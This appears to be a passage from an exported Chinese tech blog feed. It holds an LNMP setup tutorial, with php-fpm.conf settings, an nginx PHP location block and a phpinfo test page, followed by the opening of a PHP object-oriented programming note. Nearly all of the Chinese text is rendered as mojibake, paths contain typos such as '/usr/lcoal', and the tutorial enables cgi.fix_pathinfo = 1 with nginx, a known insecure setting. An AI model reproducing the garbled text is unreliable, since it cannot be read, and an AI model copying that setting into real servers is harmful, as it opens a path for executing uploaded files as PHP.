<h3 id="2-é…ç½®-1"><a href="#2-é…ç½®-1" class="headerlink" title="2.é…ç½®"></a>2.é…ç½®</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#å¤åˆ¶é…ç½®æ–‡ä»¶(å®‰è£…åŒ…ä½ç½®&#x2F;usr&#x2F;lcoal&#x2F;downloads&#x2F;php-5.6.0)</span><br><span class="line"></span><br><span class="line">1.phpé…ç½®æ–‡ä»¶php.ini</span><br><span class="line">updatedb	#æ›´æ–°locateæ•°æ®åº“ï¼Œå­˜å‚¨äº†ä½ç½®</span><br><span class="line">locate php.ini</span><br><span class="line"># å®‰è£…åŒ…å†…çš„php.inié…ç½®æ–‡ä»¶æœ‰ä¸¤ä¸ªï¼š</span><br><span class="line">## 1.php.ini-production å®‰å…¨æ€§è¾ƒé«˜ï¼Œä¸€èˆ¬ç”¨äºç”Ÿäº§</span><br><span class="line">## 2.php.ini-development ä¸€èˆ¬ç”¨äºå¼€å‘</span><br><span class="line"># å› ä¸ºç¬¬äºŒä¸ªæ¯”ç¬¬ä¸€ä¸ªæ˜¾ç¤ºçš„é”™è¯¯ä¿¡æ¯æ›´å¤šä¼šæš´éœ²ç”¨æˆ·ä¸€äº›ä¿¡æ¯ï¼Œ</span><br><span class="line"># æ‰€ä»¥ä¸€èˆ¬äº§å“è¦æ­£å¼ä½¿ç”¨çš„è¯å»ºè®®ç”¨productionï¼Œè¦ç”¨å“ªä¸ªå°±å¤åˆ¶å“ªä¸ªä¸ºphp.ini</span><br><span class="line">cp &#x2F;åˆšåˆšçš„è·¯å¾„&#x2F;php.ini-development &#x2F;usr&#x2F;local&#x2F;php56&#x2F;etc&#x2F;php.ini </span><br><span class="line"></span><br><span class="line">2.php-fpmé…ç½®æ–‡ä»¶php-fpm.conf</span><br><span class="line">cd &#x2F;usr&#x2F;local&#x2F;php56&#x2F;etc</span><br><span class="line">cp php-fpm.conf.default php-fpm.conf</span><br><span class="line"></span><br><span class="line">3.å¤åˆ¶å¯åŠ¨è„šæœ¬</span><br><span class="line">cd &#x2F;downloads&#x2F;php-5.6.30&#x2F;sapi&#x2F;fpm</span><br><span class="line">cp init.d.php-fpm &#x2F;etc&#x2F;init.d&#x2F;php-fpm</span><br><span class="line">chmod +x &#x2F;etc&#x2F;init.d&#x2F;php-fpm</span><br><span class="line"></span><br><span class="line">ln -s &#x2F;usr&#x2F;local&#x2F;php56&#x2F;sbin&#x2F;php-fpm &#x2F;usr&#x2F;local&#x2F;bin</span><br><span class="line">#å¿«æ·å‘½ä»¤</span><br><span class="line">4.è®¾ç½®php-fpmå¼€æœºè‡ªå¯åŠ¨</span><br><span class="line">chkconfig --add php-fpm</span><br><span class="line">chkconfig php-fpm on</span><br></pre></td></tr></table></figure>
<h3 id="3-ä¿®æ”¹é…ç½®æ–‡ä»¶"><a href="#3-ä¿®æ”¹é…ç½®æ–‡ä»¶" class="headerlink" title="3.ä¿®æ”¹é…ç½®æ–‡ä»¶"></a>3.ä¿®æ”¹é…ç½®æ–‡ä»¶</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">locate php-fpm.conf</span><br><span class="line">#vim ....æ–‡ä»¶è·¯å¾„</span><br><span class="line">##é…ç½®æ–‡ä»¶</span><br><span class="line">;include&#x3D;etc&#x2F;fpm.d&#x2F;*.conf</span><br><span class="line"></span><br><span class="line">;;;;;;;;;;;;;;;;;;</span><br><span class="line">; Global Options ;</span><br><span class="line">;;;;;;;;;;;;;;;;;;</span><br><span class="line">[global]</span><br><span class="line">;prefix åº”ç”¨æ ¹ç›®å½•åœ¨&#x2F;usr&#x2F;local&#x2F;php56</span><br><span class="line">;Pidæ–‡ä»¶ :é»˜è®¤var&#x2F;run&#x2F;php-rpm.pid</span><br><span class="line">pid &#x3D; run&#x2F;php-fpm.pid</span><br><span class="line"></span><br><span class="line">; é”™è¯¯æ—¥å¿— :é»˜è®¤åœ¨var&#x2F;log&#x2F;php-fpm.log</span><br><span class="line">error_log &#x3D; log&#x2F;php-fpm.log</span><br><span class="line"></span><br><span class="line">; å†™å…¥é”™è¯¯æ—¥å¿—çš„çº§åˆ«ï¼šalert, error, warning, notice(é»˜è®¤), debug</span><br><span class="line">log_level &#x3D; error</span><br><span class="line"></span><br><span class="line">; è¡¨ç¤ºåœ¨emergency_restart_intervalæ‰€è®¾å€¼å†…å‡ºç°SIGSEGVæˆ–è€…SIGBUSé”™è¯¯çš„php-cgiè¿›ç¨‹æ•°</span><br><span class="line">; å¦‚æœè¶…è¿‡ emergency_restart_thresholdä¸ªï¼Œphp-fpmå°±ä¼šä¼˜é›…é‡å¯ã€‚è¿™ä¸¤ä¸ªé»˜è®¤å€¼éƒ½æ˜¯0</span><br><span class="line">emergency_restart_threshold &#x3D; 60</span><br><span class="line">;å•ä½å¯ä»¥æ˜¯s(econd)(é»˜è®¤),m(minutes),h(hours),d(ays)</span><br><span class="line">emergency_restart_interval &#x3D; 60</span><br><span class="line"></span><br><span class="line">; é™åˆ¶å­è¿›ç¨‹æ¥å—ä¸»è¿›ç¨‹å¤ç”¨ä¿¡å·çš„è¶…æ—¶æ—¶é—´(é»˜è®¤æ˜¯0s)</span><br><span class="line">; å•ä½: s(econds)(é»˜è®¤å•ä½), m(inutes), h(ours), or d(ays)</span><br><span class="line">process_control_timeout &#x3D; 0</span><br><span class="line"></span><br><span class="line">; æœ€å¤§è¿›ç¨‹æ•°</span><br><span class="line">; process.max &#x3D; 128</span><br><span class="line"></span><br><span class="line">; ä¸»è¿›ç¨‹çš„ä¼˜å…ˆçº§ï¼Œç”±é«˜åˆ°ä½æ˜¯-19~20</span><br><span class="line">; process.priority &#x3D; -19</span><br><span class="line"></span><br><span class="line">; åå°æ‰§è¡Œfpm,é»˜è®¤å€¼ä¸ºyesï¼Œ</span><br><span class="line">; å¦‚æœä¸ºäº†è°ƒè¯•å¯ä»¥æ”¹ä¸ºnoã€‚</span><br><span class="line">; åœ¨FPMä¸­ï¼Œå¯ä»¥ä½¿ç”¨ä¸åŒçš„è®¾ç½®æ¥è¿è¡Œå¤šä¸ªè¿›ç¨‹æ± ã€‚</span><br><span class="line">; è¿™äº›è®¾ç½®å¯ä»¥é’ˆå¯¹æ¯ä¸ªè¿›ç¨‹æ± å•ç‹¬è®¾ç½®ã€‚</span><br><span class="line">daemonize &#x3D; yes</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">;;;;;;;;;;;;;;;;;;;;</span><br><span class="line">; Pool Definitions ; </span><br><span class="line">;;;;;;;;;;;;;;;;;;;;</span><br><span class="line">[www]</span><br><span class="line"></span><br><span class="line">; Per pool prefix</span><br><span class="line">; It only applies on the following directives:</span><br><span class="line">; - &#39;access.log&#39;</span><br><span class="line">; - &#39;slowlog&#39;</span><br><span class="line">; - &#39;listen&#39; (unixsocket)</span><br><span class="line">; - &#39;chroot&#39;</span><br><span class="line">; - &#39;chdir&#39;</span><br><span class="line">; - &#39;php_values&#39;</span><br><span class="line">; - &#39;php_admin_values&#39;</span><br><span class="line">;prefix &#x3D; &#x2F;path&#x2F;to&#x2F;pools&#x2F;$pool</span><br><span class="line"></span><br><span class="line">; å¯åŠ¨è¿›ç¨‹çš„è´¦æˆ·å’Œç»„</span><br><span class="line">user &#x3D; nginx</span><br><span class="line">group &#x3D; nginx</span><br><span class="line"></span><br><span class="line">; fpmç›‘å¬ç«¯å£ï¼Œå³nginxä¸­phpå¤„ç†çš„åœ°å€ï¼Œä¸€èˆ¬é»˜è®¤å€¼å³å¯ã€‚</span><br><span class="line">; å¸¸ç”¨æ ¼å¼æœ‰ &#39;ip:port&#39;ã€&#39;port&#39;ã€&#39;&#x2F;path&#x2F;to&#x2F;unix&#x2F;socket&#39;</span><br><span class="line">listen &#x3D; 127.0.0.1:9000</span><br><span class="line"></span><br><span class="line">; backlogæ•°ï¼Œ-1è¡¨ç¤ºæ— é™åˆ¶ï¼Œç”±æ“ä½œç³»ç»Ÿå†³å®šï¼Œæ­¤è¡Œæ³¨é‡Šæ‰å°±è¡Œã€‚</span><br><span class="line">;listen.backlog &#x3D; 65535</span><br><span class="line"></span><br><span class="line">; unix socketè®¾ç½®é€‰é¡¹ï¼Œå¦‚æœä½¿ç”¨tcpæ–¹å¼è®¿é—®ï¼Œè¿™é‡Œæ³¨é‡Šå³å¯ã€‚</span><br><span class="line">listen.owner &#x3D; nginx</span><br><span class="line">listen.group &#x3D; nginx</span><br><span class="line">listen.mode &#x3D; 0660</span><br><span class="line">;listen.acl_users &#x3D;</span><br><span class="line">;listen.acl_groups &#x3D;</span><br><span class="line"> </span><br><span class="line">;listen.allowed_clients &#x3D; 127.0.0.1</span><br><span class="line"></span><br><span class="line">; process.priority &#x3D; -19</span><br><span class="line"></span><br><span class="line">; å¦‚ä½•æ§åˆ¶å­è¿›ç¨‹ å¯¹äºä¸“ç”¨æœåŠ¡å™¨ï¼Œpmå¯ä»¥è®¾ç½®ä¸ºstatic</span><br><span class="line">; Possible Values:</span><br><span class="line">;   static  - a fixed number (pm.max_children) of child processes;</span><br><span class="line">;   dynamic - the number of child processes are set dynamically based on the</span><br><span class="line">;             following directives. With this process management, there will be</span><br><span class="line">;             always at least 1 children.</span><br><span class="line">;             pm.max_children      - å­è¿›ç¨‹æœ€å¤§æ•°</span><br><span class="line">;             pm.start_servers     - å¯åŠ¨æ—¶çš„è¿›ç¨‹æ•°</span><br><span class="line">;             pm.min_spare_servers - ä¿è¯ç©ºé—²è¿›ç¨‹æ•°æœ€å°å€¼ï¼Œå¦‚æœç©ºé—²è¿›ç¨‹å°äºæ­¤å€¼ï¼Œåˆ™åˆ›å»ºæ–°çš„å­è¿›ç¨‹</span><br><span class="line">;             pm.max_spare_servers - ä¿è¯ç©ºé—²è¿›ç¨‹æ•°æœ€å¤§å€¼ï¼Œå¦‚æœç©ºé—²è¿›ç¨‹å¤§äºæ­¤å€¼ï¼Œæ­¤è¿›è¡Œæ¸…ç†</span><br><span class="line">;  ondemand - no children are created at startup. Children will be forked when</span><br><span class="line">;             new requests will connect. The following parameter are used:</span><br><span class="line">;             pm.max_children           - the maximum number of children that</span><br><span class="line">;                                         can be alive at the same time.</span><br><span class="line">;             pm.process_idle_timeout   - The number of seconds after which</span><br><span class="line">;                                         an idle process will be killed.</span><br><span class="line">; Note: This value is mandatory.</span><br><span class="line">pm &#x3D; dynamic</span><br><span class="line"></span><br><span class="line">pm.max_children &#x3D; 5</span><br><span class="line">pm.start_servers &#x3D; 2</span><br><span class="line">pm.min_spare_servers &#x3D; 1</span><br><span class="line">pm.max_spare_servers &#x3D; 3</span><br><span class="line"></span><br><span class="line">;pm.process_idle_timeout &#x3D; 10s; </span><br><span class="line">; è®¾ç½®æ¯ä¸ªå­è¿›ç¨‹é‡ç”Ÿä¹‹å‰æœåŠ¡çš„è¯·æ±‚æ•°. </span><br><span class="line">; å¯¹äºå¯èƒ½å­˜åœ¨å†…å­˜æ³„æ¼çš„ç¬¬ä¸‰æ–¹æ¨¡å—æ¥è¯´æ˜¯éå¸¸æœ‰ç”¨çš„. </span><br><span class="line">; å¦‚æœè®¾ç½®ä¸º &#39;0&#39; åˆ™ä¸€ç›´æ¥å—è¯·æ±‚, ç­‰åŒäº PHP_FCGI_MAX_REQUESTS ç¯å¢ƒå˜é‡. </span><br><span class="line">; é»˜è®¤å€¼: 0</span><br><span class="line">pm.max_requests &#x3D; 500</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; FPMçŠ¶æ€é¡µé¢çš„ç½‘å€. å¦‚æœæ²¡æœ‰è®¾ç½®, åˆ™æ— æ³•è®¿é—®çŠ¶æ€é¡µé¢. é»˜è®¤å€¼: none. muninç›‘æ§ä¼šä½¿ç”¨åˆ°</span><br><span class="line">pm.status_path &#x3D; &#x2F;status</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; ;FPMç›‘æ§é¡µé¢çš„pingç½‘å€. </span><br><span class="line">; å¦‚æœæ²¡æœ‰è®¾ç½®, åˆ™æ— æ³•è®¿é—®pingé¡µé¢. </span><br><span class="line">; è¯¥é¡µé¢ç”¨äºå¤–éƒ¨æ£€æµ‹FPMæ˜¯å¦å­˜æ´»å¹¶ä¸”å¯ä»¥å“åº”è¯·æ±‚. </span><br><span class="line">; è¯·æ³¨æ„å¿…é¡»ä»¥æ–œçº¿å¼€å¤´ (&#x2F;)ã€‚</span><br><span class="line">ping.path &#x3D; &#x2F;ping</span><br><span class="line"></span><br><span class="line">; ç”¨äºå®šä¹‰pingè¯·æ±‚çš„è¿”å›å“åº”. </span><br><span class="line">; è¿”å›ä¸º HTTP 200 çš„ text&#x2F;plain æ ¼å¼æ–‡æœ¬. </span><br><span class="line">; é»˜è®¤å€¼: pong.</span><br><span class="line">;ping.response &#x3D; pong</span><br><span class="line"></span><br><span class="line">; ç™»å½• log</span><br><span class="line">access.log &#x3D; log&#x2F;$pool.access.log</span><br><span class="line"></span><br><span class="line">; accessLogæ ¼å¼</span><br><span class="line">; Default: &quot;%R - %u %t \&quot;%m %r\&quot; %s&quot;</span><br><span class="line">access.format &#x3D; &quot;%R - %u %t \&quot;%m %r%Q%q\&quot; %s %f %&#123;mili&#125;d %&#123;kilo&#125;M %C%%&quot;</span><br><span class="line"> </span><br><span class="line">;æ…¢è¯·æ±‚çš„è®°å½•æ—¥å¿—</span><br><span class="line">;é…åˆrequest_slowlog_timeoutä½¿ç”¨</span><br><span class="line">slowlog &#x3D; log&#x2F;$pool.log.slow</span><br><span class="line"> </span><br><span class="line">;å½“ä¸€ä¸ªè¯·æ±‚è¯¥è®¾ç½®çš„è¶…æ—¶æ—¶é—´å</span><br><span class="line">;å°±ä¼šå°†å¯¹åº”çš„PHPè°ƒç”¨å †æ ˆä¿¡æ¯å®Œæ•´å†™å…¥åˆ°æ…¢æ—¥å¿—ä¸­.</span><br><span class="line">;è®¾ç½®ä¸º &#39;0&#39; è¡¨ç¤º &#39;Off&#39;</span><br><span class="line">request_slowlog_timeout &#x3D; 0</span><br><span class="line"> </span><br><span class="line">; è®¾ç½®å•ä¸ªè¯·æ±‚çš„è¶…æ—¶ä¸­æ­¢æ—¶é—´. </span><br><span class="line">; è¯¥é€‰é¡¹å¯èƒ½ä¼šå¯¹php.iniè®¾ç½®ä¸­çš„&#39;max_execution_time&#39;å› ä¸ºæŸäº›ç‰¹æ®ŠåŸå› æ²¡æœ‰ä¸­æ­¢è¿è¡Œçš„è„šæœ¬æœ‰ç”¨.</span><br><span class="line">; è®¾ç½®ä¸º &#39;0&#39; è¡¨ç¤º &#39;Off&#39;.</span><br><span class="line">; å½“ç»å¸¸å‡ºç°502é”™è¯¯æ—¶å¯ä»¥å°è¯•æ›´æ”¹æ­¤é€‰é¡¹ã€‚</span><br><span class="line">request_terminate_timeout &#x3D; 0</span><br><span class="line"> </span><br><span class="line">; è®¾ç½®æ–‡ä»¶æ‰“å¼€æè¿°ç¬¦çš„rlimité™åˆ¶. </span><br><span class="line">; é»˜è®¤å€¼: ç³»ç»Ÿå®šä¹‰å€¼é»˜è®¤å¯æ‰“å¼€å¥æŸ„æ˜¯1024ï¼Œ</span><br><span class="line">; å¯ä½¿ç”¨ ulimit -næŸ¥çœ‹ï¼Œulimit -n 2048ä¿®æ”¹ã€‚</span><br><span class="line">rlimit_files &#x3D; 1024</span><br><span class="line"> </span><br><span class="line">; è®¾ç½®æ ¸å¿ƒrlimitæœ€å¤§é™åˆ¶å€¼. å¯ç”¨å€¼: &#39;unlimited&#39; ã€0æˆ–è€…æ­£æ•´æ•°. é»˜è®¤å€¼: ç³»ç»Ÿå®šä¹‰å€¼.</span><br><span class="line">;rlimit_core &#x3D; 0</span><br><span class="line"> </span><br><span class="line">; å¯åŠ¨æ—¶çš„Chrootç›®å½•. æ‰€å®šä¹‰çš„ç›®å½•éœ€è¦æ˜¯ç»å¯¹è·¯å¾„. å¦‚æœæ²¡æœ‰è®¾ç½®, åˆ™chrootä¸è¢«ä½¿ç”¨.</span><br><span class="line">;chroot &#x3D; </span><br><span class="line"> </span><br><span class="line">; è®¾ç½®å¯åŠ¨ç›®å½•ï¼Œå¯åŠ¨æ—¶ä¼šè‡ªåŠ¨Chdiråˆ°è¯¥ç›®å½•. </span><br><span class="line">; æ‰€å®šä¹‰çš„ç›®å½•éœ€è¦æ˜¯ç»å¯¹è·¯å¾„. </span><br><span class="line">; é»˜è®¤å€¼: å½“å‰ç›®å½•ï¼Œæˆ–è€…&#x2F;ç›®å½•ï¼ˆchrootæ—¶ï¼‰</span><br><span class="line">;chdir &#x3D; &#x2F;var&#x2F;www</span><br><span class="line"> </span><br><span class="line">; é‡å®šå‘è¿è¡Œè¿‡ç¨‹ä¸­çš„stdoutå’Œstderråˆ°ä¸»è¦çš„é”™è¯¯æ—¥å¿—æ–‡ä»¶ä¸­. </span><br><span class="line">; å¦‚æœæ²¡æœ‰è®¾ç½®, stdout å’Œ stderr å°†ä¼šæ ¹æ®FastCGIçš„è§„åˆ™è¢«é‡å®šå‘åˆ° &#x2F;dev&#x2F;null . </span><br><span class="line">; é»˜è®¤å€¼: ç©º.</span><br><span class="line">;catch_workers_output &#x3D; yes</span><br><span class="line"></span><br><span class="line">;clear_env &#x3D; no</span><br><span class="line"></span><br><span class="line">;security.limit_extensions &#x3D; .php .php3 .php4 .php5</span><br></pre></td></tr></table></figure>
<p><strong>é…ç½®æ–‡ä»¶ä¸­æ–‡ç¿»è¯‘</strong></p>
<p>[github][<a href="https://github.com/HeDefine/PHP.ini-for-Chinese/tree/master]">https://github.com/HeDefine/PHP.ini-for-Chinese/tree/master]</a></p>
<h1 id="6-é…ç½®nginxæ”¯æŒphp"><a href="#6-é…ç½®nginxæ”¯æŒphp" class="headerlink" title="6.é…ç½®nginxæ”¯æŒphp"></a>6.é…ç½®nginxæ”¯æŒphp</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">locate nginx.conf</span><br><span class="line">vim ..æ–‡ä»¶è·¯å¾„</span><br><span class="line"></span><br><span class="line">#å°†æ–‡ä»¶ç¬¬45è¡Œä¿®æ”¹ä¸ºå¦‚ä¸‹å†…å®¹</span><br><span class="line">index index.php index.html index.htm;</span><br><span class="line"></span><br><span class="line">#æ–‡ä»¶çš„65-72è¡Œä»£ç å‰çš„æ³¨é‡Šâ€œï¼ƒâ€å»æ‰,å¹¶æ›¿æ¢&quot;root&quot;å’Œâ€œfastcgi_paramâ€å‚æ•°å€¼ä¹Ÿå°±æ˜¯ï¼Œä½¿ç”¨&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;htmlä½œä¸ºç½‘ç«™æ ¹ç›®å½•</span><br><span class="line"></span><br><span class="line">location ~ \.php$ &#123;</span><br><span class="line">       root           &#x2F;usr&#x2F;lcoal&#x2F;nginx&#x2F;html;</span><br><span class="line">       fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">       fastcgi_index  index.php;</span><br><span class="line">       fastcgi_param  SCRIPT_FILENAME &#x2F;usr&#x2F;lcoal&#x2F;nginx&#x2F;html$fastcgi_script_name;</span><br><span class="line">           include        fastcgi_params;</span><br><span class="line">       &#125;</span><br><span class="line">locate php.ini</span><br><span class="line">vim ..æ–‡ä»¶è·¯å¾„</span><br><span class="line">#åœ¨ç»“å°¾çš„â€œï¼›Local Variablesï¼šâ€ä¹‹å‰æ·»åŠ å¦‚ä¸‹å†…å®¹</span><br><span class="line">cgi.fix_pathinfo &#x3D; 1</span><br><span class="line"></span><br><span class="line">killall -9 php-fpm</span><br><span class="line">killall -9 nginx</span><br><span class="line">nginx</span><br><span class="line">php-fpm</span><br><span class="line">#é‡å¯(ä¸ä¼šå†™è„šæœ¬)</span><br><span class="line">netstat -ntlp #æŸ¥çœ‹ç«¯å£æ˜¯å¦å¯ç”¨å¹¶è¢«php-fpmä»¥åŠnginxä½¿ç”¨</span><br></pre></td></tr></table></figure>
<h1 id="7-æŸ¥çœ‹LNMPç½‘ç«™ç¯å¢ƒ"><a href="#7-æŸ¥çœ‹LNMPç½‘ç«™ç¯å¢ƒ" class="headerlink" title="7.æŸ¥çœ‹LNMPç½‘ç«™ç¯å¢ƒ"></a>7.æŸ¥çœ‹LNMPç½‘ç«™ç¯å¢ƒ</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;lcoal&#x2F;nginx&#x2F;html</span><br><span class="line">touch info.php</span><br><span class="line">vim info.php</span><br><span class="line">#åŠ å…¥ä¸‹é¢å†…å®¹</span><br><span class="line">&lt;?php</span><br><span class="line">  phpinfo();</span><br><span class="line">?&gt;</span><br><span class="line">#å†™å…¥é€€å‡º</span><br><span class="line">ECS</span><br><span class="line">:wq</span><br><span class="line"></span><br><span class="line">#è®¿é—®http:&#x2F;&#x2F;ip&#x2F;info.php</span><br><span class="line">#æµ‹è¯•æ˜¯å¦è§£æphpï¼Œè‹¥æˆåŠŸï¼Œåˆ™é…ç½®å®Œæˆ</span><br></pre></td></tr></table></figure>
<h1 id="8-å¸¸è§é—®é¢˜"><a href="#8-å¸¸è§é—®é¢˜" class="headerlink" title="8.å¸¸è§é—®é¢˜"></a>8.å¸¸è§é—®é¢˜</h1><p><strong>è®¿é—®ä¸åˆ°ç½‘ç«™?</strong></p>
<p>æ£€æŸ¥é˜²ç«å¢™é…ç½®å¹¶pingæœåŠ¡å™¨IPã€telnetæœåŠ¡å™¨80ç«¯å£æµ‹è¯•è¿é€šæ€§</p>
<p><strong>èƒ½è®¿é—®åˆ°htmlæ–‡ä»¶å´è®¿é—®ä¸åˆ°phpæ–‡ä»¶?</strong></p>
<p>å®‰è£…phpå’Œé…ç½®nginxæ”¯æŒphpçš„æ­¥éª¤æ˜¯å¦æ­£ç¡®ã€‚</p>
<p>//FILE FAILD FIND æ˜¯ç”±äºnginxé…ç½®æ²¡æœ‰é…å¥½</p>
<p>//æ‰€æœ‰ç»“æŸåï¼Œåˆ é™¤info.php</p>
<h1 id="9-å‚è€ƒæ–‡çŒ®"><a href="#9-å‚è€ƒæ–‡çŒ®" class="headerlink" title="9.å‚è€ƒæ–‡çŒ®"></a>9.å‚è€ƒæ–‡çŒ®</h1><p>[æ‰‹åŠ¨é…ç½®LNMP][<a href="https://www.jianshu.com/p/292514f97944]">https://www.jianshu.com/p/292514f97944]</a></p>
<p>[é˜¿é‡Œäº‘å¼€æ”¾å®éªŒå®¤][<a href="https://edu.aliyun.com/lab/courses/14107e607fe742a88a60d1148d7b405c/detail?purchaseRecordId=4eddcaf58df543d9b96af97a5b2d9342%5D">https://edu.aliyun.com/lab/courses/14107e607fe742a88a60d1148d7b405c/detail?purchaseRecordId=4eddcaf58df543d9b96af97a5b2d9342]</a></p>
<h1 id="0-æ‰©å±•"><a href="#0-æ‰©å±•" class="headerlink" title="0.æ‰©å±•"></a>0.æ‰©å±•</h1><p>[Nginx - ç»´åŸºç™¾ç§‘][<a href="https://zh.wikipedia.org/wiki/Nginx]">https://zh.wikipedia.org/wiki/Nginx]</a></p>
<p>[8åˆ†é’Ÿå¸¦ä½ æ·±å…¥æµ…å‡ºææ‡‚Nginx][<a href="https://zhuanlan.zhihu.com/p/34943332]">https://zhuanlan.zhihu.com/p/34943332]</a></p>
<p>[PHPMyadmin é…ç½®æ–‡ä»¶è¯¦è§£(é…ç½®)][<a href="https://www.jb51.net/article/21228.html]">https://www.jb51.net/article/21228.html]</a></p>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Note</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPé¢å‘å¯¹è±¡</title>
    <url>/2019/05/20/Note/PHP%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</url>
    <content><![CDATA[<h1 id="PHPé¢å‘å¯¹è±¡"><a href="#PHPé¢å‘å¯¹è±¡" class="headerlink" title="PHPé¢å‘å¯¹è±¡"></a>PHPé¢å‘å¯¹è±¡</h1><h2 id="ä¸ºä»€ä¹ˆè¦é¢å‘å¯¹è±¡"><a href="#ä¸ºä»€ä¹ˆè¦é¢å‘å¯¹è±¡" class="headerlink" title="ä¸ºä»€ä¹ˆè¦é¢å‘å¯¹è±¡"></a>ä¸ºä»€ä¹ˆè¦é¢å‘å¯¹è±¡</h2><p>é¢å‘å¯¹è±¡çš„å¥½å¤„è¿œè¿œä¸åªæ˜¯ä¾¿äºç»´æŠ¤ä»£ç ï¼Œä»–æ‰€ä½“ç°çš„é¢å‘å¯¹è±¡çš„æ€æƒ³å°†ä¸€ä¸ªä½“ç³»åˆ†ä½œå¾ˆå¤šçš„ä¸ªä½“ï¼Œè¿™æ ·æ¥ï¼Œåˆ«äººåªéœ€è¦çŸ¥é“æ€ä¹ˆè°ƒç”¨ä½ æ‰€å†™çš„ç±»æˆ–å¯¹è±¡ã€‚</p>
<a id="more"></a>

<h2 id="ç±»å’Œå¯¹è±¡ï¼š"><a href="#ç±»å’Œå¯¹è±¡ï¼š" class="headerlink" title="ç±»å’Œå¯¹è±¡ï¼š"></a>ç±»å’Œå¯¹è±¡ï¼š</h2><p><strong>ç±»</strong>ï¼š å®šä¹‰äº†ä¸€ä»¶äº‹ç‰©çš„æŠ½è±¡ç‰¹ç‚¹ã€‚ç±»çš„å®šä¹‰åŒ…å«äº†æ•°æ®çš„å½¢å¼ä»¥åŠå¯¹æ•°æ®çš„æ“ä½œã€‚<br><strong>å¯¹è±¡</strong>ï¼šæ˜¯ç±»çš„å®ä¾‹ã€‚<br>å…·ä½“ä¸€ç‚¹ï¼Œæœ‰ä¸€ä¸ªç±»æ˜¯äººç±»ï¼Œè¿™ä¸ªäººç±»å°±æ˜¯æŠ½è±¡çš„ï¼Œè€Œå¼ ä¸‰è¿™ä¸ªäººå°±æ˜¯å®ä¾‹åŒ–çš„å¯¹è±¡ã€‚<br>ç±»æ˜¯å¯¹è±¡çš„<strong>æ¨¡æ¿</strong>ï¼Œå¯¹è±¡æ˜¯ç±»çš„<strong>å®ä¾‹</strong><br><strong>æˆå‘˜å˜é‡</strong> âˆ’ å®šä¹‰åœ¨ç±»å†…éƒ¨çš„å˜é‡ã€‚è¯¥å˜é‡çš„å€¼å¯¹å¤–æ˜¯ä¸å¯è§çš„ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡æˆå‘˜å‡½æ•°è®¿é—®ï¼Œåœ¨ç±»è¢«å®ä¾‹åŒ–ä¸ºå¯¹è±¡åï¼Œè¯¥å˜é‡å³å¯ç§°ä¸ºå¯¹è±¡çš„<strong>å±æ€§</strong>ã€‚<br>ç±»ç»“æ„</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class classname</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>ç±»çš„åŸºæœ¬å®šä¹‰</strong>ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class classname</span><br><span class="line">&#123;</span><br><span class="line">    æˆå‘˜å±æ€§&#x2F;&#x2F;å‰é¢æœ‰è®¿é—®æ§åˆ¶ç¬¦ public protected private</span><br><span class="line">    æˆå‘˜æ–¹æ³•</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>åˆ›å»ºå¯¹è±¡</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$å¯¹è±¡å &#x3D; new ç±»åï¼ˆï¼‰ï¼›</span><br></pre></td></tr></table></figure>
<p>ç±»åä¸åŒºåˆ†å¤§å°å†™ï¼Œé‡‡ç”¨é©¼å³°å¼</p>
<p><strong>è®¿é—®å¯¹è±¡çš„å±æ€§</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$å¯¹è±¡å-&gt;$å±æ€§å</span><br></pre></td></tr></table></figure>
<p>å¯¹è±¡ä¼ é€’æœºåˆ¶è¯´æ˜<br>å¯¹è±¡ä¼ é€’çš„ä¸æ˜¯æ•°æ®æœ¬èº«ï¼Œè€Œæ˜¯<strong>å¯¹è±¡æ ‡è¯†ç¬¦</strong><br>è¿™é‡Œæœ‰ä¸¤ä¸ªæœ‰è¶£çš„ä¾‹å­</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class cat</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line">    public $color;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new cat();</span><br><span class="line">$a-&gt;name &#x3D; &#39;Tom&#39;;</span><br><span class="line">$a-&gt;age &#x3D; &#39;2&#39;;</span><br><span class="line">$a-&gt;color &#x3D; &#39;red&#39;;</span><br><span class="line">$b &#x3D; $a;</span><br><span class="line">echo $b-&gt;color;</span><br><span class="line">$b-&gt;name &#x3D; &quot;Sam&quot;;</span><br><span class="line">echo $a-&gt;name;</span><br></pre></td></tr></table></figure>
<p>åœ¨è¿™é‡Œï¼Œä½ ä¼šå‘ç°è¾“å‡ºçš„açš„nameå±…ç„¶éšç€bçš„ä¿®æ”¹è€Œå˜åŒ–äº†<br>è¿™æ˜¯åº”ä¸ºï¼Œè¿™ç§ä¼ å€¼æ˜¯ä¼ å¯¹è±¡æ ‡è¯†ç¬¦ï¼Œç›¸å½“äºåœ¨åˆ›å»º<code>$a</code>çš„æ—¶å€™å°±åˆ›å»ºäº†ä¸€ä¸ª#1çš„å¯¹è±¡æ ‡è¯†ç¬¦ï¼Œå¯¹<code>$b</code>æ¥è¯´ä»–åªæ˜¯å¤åˆ¶äº†ä¸€ä»½å’Œ<code>$a</code>ä¸€æ¨¡ä¸€æ ·çš„å¯¹è±¡æ ‡è¯†ç¬¦æŒ‡å‘æ•°æ®å­˜å‚¨çš„ä½ç½®ï¼Œæ‰€ä»¥ä¼šå¾—åˆ°é‚£ç§ç»“æœå•¦</p>
